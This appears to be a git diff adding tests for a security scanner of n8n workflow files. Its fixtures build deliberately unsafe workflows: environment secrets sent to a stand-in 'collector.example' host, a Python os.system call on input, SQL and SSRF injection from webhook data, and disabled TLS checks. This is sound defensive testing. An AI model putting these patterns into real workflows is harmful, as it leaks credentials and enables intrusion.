@@ -1,13 +1,24 @@
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import test from "node:test";
 import { assessBytes } from "../dist/assessment-engine.js";
+import { assessmentReportSchema } from "../dist/assessment-contract.js";
+import { runGitleaks } from "../dist/gitleaks.js";
+import { analyzeNativeInspection } from "../dist/native-inspection.js";
 import {
   buildServiceReport,
   serviceReportSchema,
 } from "../dist/service-report.js";
 import { presentInspection, inspectionSchema } from "../dist/inspection.js";
+import { analyzeContent } from "../dist/static-content.js";
 import { createContext } from "../dist/static-context.js";
+import {
+  ruleResultSchema,
+  staticReportSchema,
+} from "../dist/static-contract.js";
+import { analyzeStatic } from "../dist/static-engine.js";
 import { analyzeFlow } from "../dist/static-flow.js";
+import { analyzeSettings } from "../dist/static-settings.js";
 import { buildValueFlow } from "../dist/value-flow.js";
 
 const node = (name, type, typeVersion = 1, parameters = {}, raw = {}) => ({
@@ -31,13 +42,15 @@ const chain = (...nodes) => ({
   ),
 });
 
+const cleanGitleaks = {
+  tool: "gitleaks",
+  version: "8.30.1",
+  status: "completed",
+  findings: [],
+};
+
 const mockTools = async () => ({
-  gitleaks: {
-    tool: "gitleaks",
-    version: "8.30.1",
-    status: "completed",
-    findings: [],
-  },
+  gitleaks: cleanGitleaks,
   native: {
     tool: "native_inspection",
     version: "1.0.0",
@@ -59,11 +72,24 @@ const mockTools = async () => ({
   },
 });
 
-const assess = (workflow) =>
-  assessBytes(Buffer.from(JSON.stringify(workflow)), {
+const assess = (workflow, evidence) => {
+  const bytes = Buffer.from(JSON.stringify(workflow));
+  const inputSha256 = createHash("sha256").update(bytes).digest("hex");
+  return assessBytes(bytes, {
+    evidenceBytes: evidence
+      ? Buffer.from(JSON.stringify({ ...evidence, inputSha256 }))
+      : undefined,
     collectTools: mockTools,
     now: "2026-11-26T00:00:00.000Z",
   });
+};
+
+const evidenceCodes = (rules) =>
+  rules.flatMap((rule) =>
+    rule.findings.flatMap((finding) =>
+      finding.evidence.map((entry) => entry.code),
+    ),
+  );
 
 test("declarative local catalog nodes preserve provenance while unsafe modes remain opaque", () => {
   for (const middle of [
@@ -705,4 +731,546 @@ test("2nd-pass regressions: BlockStatement lexical scoping, html_extract externa
     assert.ok(service.serviceScope.sinkReachableGapCount > 0, label);
     assert.equal(service.serviceScope.isolatedGapCount, 0, label);
   }
+});
+
+test("B1: literal template prefixes preserve external trust across AI prompts, SSRF, and command sinks", async () => {
+  const aiDoc = {
+    nodes: [
+      node("Webhook", "webhook", 2.1),
+      node("Agent", "@n8n/n8n-nodes-langchain.agent", 1.7, {
+        promptType: "define",
+        text: "=Summarize: {{ $json.body.text }}",
+      }),
+      node("Tool", "httpRequestTool", 4.2, { url: "https://example.invalid" }),
+    ],
+    connections: {
+      Webhook: { main: [[{ node: "Agent", type: "main", index: 0 }]] },
+      Tool: { ai_tool: [[{ node: "Agent", type: "ai_tool", index: 0 }]] },
+    },
+  };
+  const aiReport = assessmentReportSchema.parse(await assess(aiDoc));
+  assert.ok(
+    evidenceCodes(aiReport.files[0].extensionRules).includes(
+      "ai_external_prompt_may_influence_tool_selection",
+    ),
+  );
+
+  for (const [label, trigger] of [
+    ["telegram", node("Trigger", "telegramTrigger", 1.2)],
+    ["form", node("Trigger", "formTrigger", 2.3)],
+    ["chat", node("Trigger", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1)],
+  ]) {
+    const ssrfDoc = chain(
+      trigger,
+      node("Req", "httpRequest", 4.2, {
+        url: "=https://{{ $json.message.text }}/api",
+      }),
+    );
+    const ssrfReport = assessmentReportSchema.parse(await assess(ssrfDoc));
+    const ssrf = ssrfReport.files[0].extensionRules.find(
+      (r) => r.ruleId === "N8N_MAPPED_HTTP_DESTINATION",
+    );
+    assert.ok(
+      ssrf.findings.some(
+        (f) =>
+          f.severity === "high" &&
+          f.evidence.some(
+            (e) => e.code === "http_destination_external_input_candidate",
+          ),
+      ),
+      label,
+    );
+  }
+});
+
+test("B2-B4: code spread, runOnceForEachItem code mode, and credential projections retain secret candidates", async () => {
+  const spreadDoc = chain(
+    node("Start", "manualTrigger", 1),
+    node("Code", "code", 2, {
+      jsCode:
+        "return $input.all().map(i => ({ json: { k: $env.STRIPE, ...i.json } }));",
+    }),
+    node("Req", "httpRequest", 4.2, {
+      url: "=https://collector.example/c?k={{ $json.k }}",
+    }),
+  );
+  const spreadReport = await assess(spreadDoc);
+  assert.ok(
+    evidenceCodes(spreadReport.files[0].extensionRules).includes(
+      "secret_candidate_transferred",
+    ),
+  );
+
+  const eachItemDoc = chain(
+    node("Start", "manualTrigger", 1),
+    node("Code", "code", 2, {
+      mode: "runOnceForEachItem",
+      jsCode: "return { json: { x: $env.STRIPE } };",
+    }),
+    node("Req", "httpRequest", 4.2, {
+      url: "=https://collector.example/c?x={{ $json.x }}",
+    }),
+  );
+  const eachItemReport = await assess(eachItemDoc);
+  assert.ok(
+    evidenceCodes(eachItemReport.files[0].extensionRules).includes(
+      "secret_candidate_transferred",
+    ),
+  );
+
+  const setCredDoc = chain(
+    node("Start", "manualTrigger", 1),
+    node("Set", "set", 3.4, {
+      assignments: {
+        assignments: [{ name: "cfg", type: "object", value: "={{ $env }}" }],
+      },
+    }),
+    node("Req", "httpRequest", 4.2, {
+      url: "=https://collector.example/c?k={{ $json.cfg.STRIPE }}",
+    }),
+  );
+  const setCredReport = await assess(setCredDoc);
+  assert.ok(
+    evidenceCodes(setCredReport.files[0].extensionRules).includes(
+      "secret_candidate_transferred",
+    ),
+  );
+
+  const codeCredDoc = chain(
+    node("Start", "manualTrigger", 1),
+    node("Code", "code", 2, {
+      jsCode:
+        "const cfg = { env: $env }; return [{ json: { k: cfg.env.STRIPE } }];",
+    }),
+    node("Req", "httpRequest", 4.2, {
+      url: "=https://collector.example/c?k={{ $json.k }}",
+    }),
+  );
+  const codeCredReport = await assess(codeCredDoc);
+  assert.ok(
+    evidenceCodes(codeCredReport.files[0].extensionRules).includes(
+      "secret_candidate_transferred",
+    ),
+  );
+});
+
+test("B5-B6: request_auth covers form/chat/mcp triggers and transport/egress cover httpRequestTool", async () => {
+  const unauthTriggers = [
+    node("Form", "formTrigger", 2.3, { authentication: "none" }),
+    node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1, {
+      public: true,
+      authentication: "none",
+    }),
+    node("Mcp", "@n8n/n8n-nodes-langchain.mcpTrigger", 2, {
+      authentication: "none",
+    }),
+  ];
+  for (const trigger of unauthTriggers) {
+    const authRule = analyzeSettings(
+      createContext(
+        Buffer.from(JSON.stringify({ nodes: [trigger], connections: {} })),
+      ),
+    ).find((r) => r.category === "request_auth");
+    assert.equal(authRule.coverage[0].status, "checked", trigger.name);
+    assert.ok(
+      evidenceCodes([authRule]).includes("webhook_authentication_none"),
+      trigger.name,
+    );
+    const blocked = await assess(
+      { nodes: [trigger], connections: {} },
+      {
+        schemaVersion: "1.0.0",
+        sources: [
+          {
+            id: "src-1",
+            kind: "declaration",
+            method: "user_declaration",
+            recordedAt: "2026-11-26T00:00:00.000Z",
+          },
+        ],
+        policy: {
+          id: "strict-auth",
+          version: "1.0.0",
+          sourceId: "src-1",
+          purpose: "require request authentication",
+          defaultDecision: "allow",
+          unknownDecision: "review",
+          rules: [],
+          egress: [],
+          exceptions: [],
+          requireAuthenticatedWebhook: true,
+          requireAiApproval: false,
+          requirePublicationReview: true,
+        },
+      },
+    );
+    assert.equal(blocked.decision, "block", trigger.name);
+  }
+
+  const privateChat = analyzeSettings(
+    createContext(
+      Buffer.from(
+        JSON.stringify({
+          nodes: [
+            node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1, {
+              public: false,
+            }),
+          ],
+          connections: {},
+        }),
+      ),
+    ),
+  ).find((r) => r.category === "request_auth");
+  assert.equal(privateChat.coverage[0].status, "checked");
+  assert.equal(privateChat.findings.length, 0);
+
+  const authChat = analyzeSettings(
+    createContext(
+      Buffer.from(
+        JSON.stringify({
+          nodes: [
+            node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1, {
+              public: true,
+              authentication: "n8nUserAuth",
+            }),
+          ],
+          connections: {},
+        }),
+      ),
+    ),
+  ).find((r) => r.category === "request_auth");
+  assert.equal(authChat.coverage[0].status, "checked");
+  assert.ok(
+    evidenceCodes([authChat]).includes("webhook_authentication_configured"),
+  );
+
+  const httpToolDoc = {
+    nodes: [
+      node("Webhook", "webhook", 2.1),
+      node("Agent", "@n8n/n8n-nodes-langchain.agent", 1.7, {
+        text: "={{ $json.body.text }}",
+      }),
+      node("Tool", "httpRequestTool", 4.2, {
+        url: "http://collector.example/api",
+        options: { allowUnauthorizedCerts: true },
+      }),
+    ],
+    connections: {
+      Webhook: { main: [[{ node: "Agent", type: "main", index: 0 }]] },
+      Tool: { ai_tool: [[{ node: "Agent", type: "ai_tool", index: 0 }]] },
+    },
+  };
+  const httpToolReport = assessmentReportSchema.parse(
+    await assess(httpToolDoc),
+  );
+  const allRules = [
+    ...httpToolReport.files[0].base.rules,
+    ...httpToolReport.files[0].extensionRules,
+  ];
+  assert.ok(
+    evidenceCodes(allRules).includes("tls_certificate_validation_disabled"),
+  );
+  assert.ok(evidenceCodes(allRules).includes("plaintext_http_url"));
+  assert.ok(
+    allRules
+      .find((r) => r.ruleId === "N8N_EXTENDED_OUTBOUND_DATA")
+      .findings.some((f) =>
+        f.evidence.some((e) => e.code === "outbound_send_capability"),
+      ),
+  );
+});
+
+test("C1-C4: native scope diagnostic reservation, CR Python lines, empty string skipping, and cross-field gitleaks", async () => {
+  // C1: 130 scope diagnostics must not crowd out native_input_scope_limit or native_finding_limit.
+  const koreanNotes = Object.fromEntries(
+    Array.from({ length: 130 }, (_, i) => [`k${i}`, `한글 메모 ${i}`]),
+  );
+  const c1Doc = {
+    nodes: [node("Start", "manualTrigger", 1)],
+    connections: {},
+    notes: koreanNotes,
+  };
+  const c1Ctx = createContext(Buffer.from(JSON.stringify(c1Doc)));
+  const noteFields = c1Ctx.fields.filter(
+    (f) => f.kind === "value" && f.pointer.startsWith("/notes/"),
+  );
+  const nativeScan = {
+    tool: "native_inspection",
+    version: "1.0.0",
+    modes: [
+      {
+        mode: "nlp",
+        status: "completed",
+        findings: [],
+        diagnostics: [
+          { fieldIndex: null, code: "nlp_english_model_profile" },
+          ...noteFields.map((f) => ({
+            fieldIndex: f.index,
+            code: "nlp_language_outside_profile",
+          })),
+          { fieldIndex: null, code: "native_input_scope_limit" },
+          { fieldIndex: null, code: "native_finding_limit" },
+        ],
+        versions: {
+          python: "3.11.2",
+          presidio: "2.2.366",
+          spacy: "3.8.18",
+          model: "en_core_web_sm@3.8.0",
+        },
+      },
+      {
+        mode: "python",
+        status: "completed",
+        findings: [],
+        diagnostics: [],
+        versions: {
+          python: "3.11.2",
+          presidio: null,
+          spacy: null,
+          model: null,
+        },
+      },
+    ],
+  };
+  const c1Rules = analyzeNativeInspection(c1Ctx, nativeScan).map((r) =>
+    ruleResultSchema.parse(r),
+  );
+  const nlpRule = c1Rules[0];
+  assert.ok(nlpRule.diagnostics.length <= 128);
+  assert.ok(
+    nlpRule.diagnostics.some((d) => d.code === "native_input_scope_limit"),
+  );
+  assert.ok(nlpRule.diagnostics.some((d) => d.code === "native_finding_limit"));
+
+  const c1Report = await assessBytes(Buffer.from(JSON.stringify(c1Doc)), {
+    collectTools: async () => ({ gitleaks: cleanGitleaks, native: nativeScan }),
+    now: "2026-11-26T00:00:00.000Z",
+  });
+  const c1Service = serviceReportSchema.parse(buildServiceReport(c1Report));
+  assert.equal(c1Service.analysisStatus, "review_required");
+  assert.equal(c1Service.serviceScope.securityReviewRequired, true);
+
+  // Non-string language field on Code node must not throw TypeError in pythonNode.
+  const badLangDoc = {
+    nodes: [
+      node("CodeBad", "code", 2, {
+        language: { unexpected: true },
+        jsCode: "return [];",
+      }),
+    ],
+    connections: {},
+  };
+  const badLangReport = assessmentReportSchema.parse(await assess(badLangDoc));
+  assert.notEqual(badLangReport.status, "error");
+
+  // C2: standalone \r line endings in Python code must validate line numbers cleanly.
+  const crDoc = {
+    nodes: [
+      node("Py", "code", 2, {
+        language: "pythonNative",
+        pythonCode: "import os\rx=1\ros.system(_json['c'])",
+      }),
+    ],
+    connections: {},
+  };
+  const crCtx = createContext(Buffer.from(JSON.stringify(crDoc)));
+  const pyField = crCtx.fields.find(
+    (f) => f.kind === "value" && f.pointer.endsWith("/pythonCode"),
+  );
+  const crRules = analyzeNativeInspection(crCtx, {
+    tool: "native_inspection",
+    version: "1.0.0",
+    modes: [
+      {
+        mode: "python",
+        status: "completed",
+        findings: [
+          {
+            fieldIndex: pyField.index,
+            code: "python_external_input_shell_call",
+            start: null,
+            end: null,
+            line: 3,
+          },
+        ],
+        diagnostics: [
+          { fieldIndex: pyField.index, code: "python_static_profile_limited" },
+        ],
+        versions: {
+          python: "3.11.2",
+          presidio: null,
+          spacy: null,
+          model: null,
+        },
+      },
+    ],
+  }).map((r) => ruleResultSchema.parse(r));
+  assert.equal(
+    crRules[0].diagnostics.some((d) => d.code === "native_invalid_report"),
+    false,
+  );
+  assert.ok(
+    crRules[0].findings.some((f) =>
+      f.evidence.some((e) => e.code === "python_external_input_shell_call"),
+    ),
+  );
+
+  // C3: >16,384 empty strings must not trigger tool_input_limit before scanning.
+  const emptyFields = Array.from({ length: 16_385 }, (_, index) => ({
+    index,
+    value: "",
+  }));
+  const emptyScan = await runGitleaks(emptyFields, {
+    executable: process.execPath,
+    signal: AbortSignal.abort(),
+  });
+  assert.equal(emptyScan.reason, "tool_cancelled");
+
+  // C4: tool_cross_field_match retains valid secret findings while marking partial coverage.
+  const crossDoc = {
+    nodes: [node("Start", "manualTrigger", 1)],
+    connections: {},
+    notes: { a: "synthetic-a", b: "synthetic-b" },
+  };
+  const crossCtx = createContext(Buffer.from(JSON.stringify(crossDoc)));
+  const fieldA = crossCtx.fields.find(
+    (f) => f.kind === "value" && f.pointer === "/notes/a",
+  );
+  const crossTool = {
+    tool: "gitleaks",
+    version: "8.30.1",
+    status: "completed",
+    findings: [{ fieldIndex: fieldA.index, ruleId: "private-key" }],
+    diagnostics: ["tool_cross_field_match"],
+  };
+  const [secretsRule] = analyzeContent(crossCtx, crossTool).map((r) =>
+    ruleResultSchema.parse(r),
+  );
+  assert.equal(secretsRule.findings.length, 1);
+  assert.equal(secretsRule.coverage[0].status, "partial");
+  assert.ok(
+    secretsRule.diagnostics.some((d) => d.code === "tool_cross_field_match"),
+  );
+  const crossReport = assessmentReportSchema.parse(
+    await assessBytes(Buffer.from(JSON.stringify(crossDoc)), {
+      collectTools: async () => ({
+        gitleaks: crossTool,
+        native: (await mockTools()).native,
+      }),
+      now: "2026-11-26T00:00:00.000Z",
+    }),
+  );
+  const crossService = serviceReportSchema.parse(
+    buildServiceReport(crossReport),
+  );
+  assert.equal(crossService.analysisStatus, "review_required");
+  assert.ok(
+    crossService.analysisGaps.some((g) => g.code === "tool_cross_field_match"),
+  );
+});
+
+test("D1-D2: sink-reachable gaps traverse through intermediate sinks and disabled main pass-through nodes", async () => {
+  // D1: lastNode webhook -> httpRequest -> set(v99) must count set(v99) gaps as sink-reachable.
+  const lastNodeChain = chain(
+    node("Hook", "webhook", 2.1, { responseMode: "lastNode" }),
+    node("Req", "httpRequest", 4.2, { url: "https://example.invalid" }),
+    node("Opaque", "set", 99),
+  );
+  const lastNodeService = serviceReportSchema.parse(
+    buildServiceReport(await assess(lastNodeChain)),
+  );
+  assert.ok(lastNodeService.serviceScope.sinkReachableGapCount > 0);
+  assert.equal(lastNodeService.serviceScope.isolatedGapCount, 0);
+
+  // D1: executeWorkflowTrigger -> httpRequest -> set(v99)
+  const subworkflowChain = chain(
+    node("SubIn", "executeWorkflowTrigger", 1.1),
+    node("Req", "httpRequest", 4.2, { url: "https://example.invalid" }),
+    node("Opaque", "set", 99),
+  );
+  const subworkflowService = serviceReportSchema.parse(
+    buildServiceReport(await assess(subworkflowChain)),
+  );
+  assert.ok(subworkflowService.serviceScope.sinkReachableGapCount > 0);
+  assert.equal(subworkflowService.serviceScope.isolatedGapCount, 0);
+
+  // D2: disabled pass-through noOp between gap node and active sink preserves sink reachability.
+  const disabledPassThrough = chain(
+    node("Hook", "webhook", 2.1),
+    node("Opaque", "set", 99),
+    node("Pass", "noOp", 1, {}, { disabled: true }),
+    node("Req", "httpRequest", 4.2, {
+      method: "POST",
+      url: "https://example.invalid",
+      sendBody: true,
+      contentType: "raw",
+      body: "={{ $json.secret }}",
+    }),
+  );
+  const disabledPassService = serviceReportSchema.parse(
+    buildServiceReport(await assess(disabledPassThrough)),
+  );
+  assert.ok(disabledPassService.serviceScope.sinkReachableGapCount > 0);
+  assert.equal(disabledPassService.serviceScope.isolatedGapCount, 0);
+
+  // D2 negative: disabled terminal sink does not make an upstream isolated node sink-reachable.
+  const disabledTerminalSink = chain(
+    node("Hook", "webhook", 2.1),
+    node("Opaque", "set", 99),
+    node(
+      "DisabledReq",
+      "httpRequest",
+      4.2,
+      { url: "https://example.invalid" },
+      { disabled: true },
+    ),
+  );
+  const disabledTerminalService = serviceReportSchema.parse(
+    buildServiceReport(await assess(disabledTerminalSink)),
+  );
+  assert.ok(disabledTerminalService.serviceScope.isolatedGapCount > 0);
+});
+
+test("CodeRabbit static-flow: 90 stopAndError nodes stay within the 256 diagnostic cap and preserve other rules", async () => {
+  const stopNodes = Array.from({ length: 90 }, (_, index) =>
+    node(`Stop${index}`, "stopAndError", 1, { errorType: "future" }),
+  );
+  const workflow = {
+    nodes: [
+      node("Hook", "webhook", 2.1, { authentication: "none" }),
+      node("Db", "postgres", 2.8, {
+        operation: "executeQuery",
+        query: "SELECT * FROM t WHERE id = '{{ $json.body.id }}'",
+      }),
+      node("Opaque", "set", 99),
+      ...stopNodes,
+    ],
+    connections: {
+      Hook: { main: [[{ node: "Db", type: "main", index: 0 }]] },
+    },
+  };
+  const bytes = Buffer.from(JSON.stringify(workflow));
+  const staticReport = staticReportSchema.parse(
+    analyzeStatic(bytes, cleanGitleaks),
+  );
+  assert.notEqual(staticReport.status, "error");
+  const outputRule = staticReport.rules.find(
+    (r) => r.ruleId === "N8N_RESPONSE_EXPOSURE",
+  );
+  assert.ok(outputRule.diagnostics.length <= 256);
+  assert.ok(
+    outputRule.diagnostics.some(
+      (d) => d.code === "definition_diagnostic_limit",
+    ),
+  );
+  assert.ok(
+    outputRule.coverage.slice(-5).every((c) => c.status === "unsupported"),
+  );
+  const sqlRule = staticReport.rules.find(
+    (r) => r.ruleId === "N8N_SQL_TEXT_FLOW",
+  );
+  assert.ok(sqlRule.findings.length > 0);
+
+  const fullAssessment = assessmentReportSchema.parse(await assess(workflow));
+  assert.notEqual(fullAssessment.status, "error");
 });
